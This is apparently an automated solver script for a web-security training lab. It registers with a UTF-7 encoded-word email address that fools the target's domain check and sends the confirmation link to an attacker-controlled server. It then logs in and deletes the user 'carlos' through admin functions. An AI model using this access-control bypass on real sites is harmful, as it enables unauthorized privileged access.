const {
  deleteCarlos,
  getExploitServerUrl,
  latestEmailLink,
  openEmailClient,
  runLab,
} = require('./_common.cjs');

const TITLE = 'Bypassing access controls using email address parsing discrepancies';
const PATH = '/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies';

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    const exploitUrl = await getExploitServerUrl(page, labUrl);
    const exploitHost = new URL(exploitUrl).host;
    const username = `attacker${Date.now().toString(36).slice(-5)}`;
    const password = 'P@ssw0rd123!';
    const email = `=?utf-7?q?${username}&AEA-${exploitHost}&ACA-?=@ginandjuice.shop`;

    await page.goto(labUrl + '/register', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.fill('input[name="username"]', username);
    await page.fill('input[name="email"]', email);
    await page.fill('input[name="password"]', password);
    await Promise.all([
      page.waitForNavigation({ timeout: 10000 }).catch(() => {}),
      page.click('button[type="submit"], input[type="submit"]'),
    ]);

    const emailUrl = await openEmailClient(page, labUrl);
    if (!emailUrl) {
      throw new Error('Email client not available');
    }

    let confirmUrl = '';
    for (let attempt = 0; attempt < 8 && !confirmUrl; attempt += 1) {
      // eslint-disable-next-line no-await-in-loop
      await page.goto(emailUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
      // eslint-disable-next-line no-await-in-loop
      const href = await page.evaluate(({ marker1, marker2 }) => {
        const rows = [...document.querySelectorAll('tr, li, div')];
        const row = rows.find((item) => {
          const text = item.textContent || '';
          return text.includes(marker1) || text.includes(marker2);
        });
        if (!row) return '';
        return [...row.querySelectorAll('a[href]')].map((anchor) => anchor.href).find((value) => /confirm-registration|temp-registration-token/i.test(value)) || '';
      }, { marker1: username, marker2: exploitHost });
      confirmUrl = href || '';
      if (!confirmUrl) {
        // eslint-disable-next-line no-await-in-loop
        confirmUrl = await latestEmailLink(page, emailUrl, /\/confirm-registration\?[^\s"'<]+|\/register\?temp-registration-token=[^\s"'<]+/i);
      }
      if (!confirmUrl) {
        // eslint-disable-next-line no-await-in-loop
        await page.waitForTimeout(1000);
      }
    }

    if (!confirmUrl) {
      throw new Error('Registration confirmation email not found');
    }

    await page.goto(confirmUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.fill('input[name="username"]', username);
    await page.fill('input[name="password"]', password);
    await Promise.all([
      page.waitForNavigation({ timeout: 10000 }).catch(() => {}),
      page.click('button[type="submit"], input[type="submit"]'),
    ]);
    await deleteCarlos(page, labUrl);
  },
});
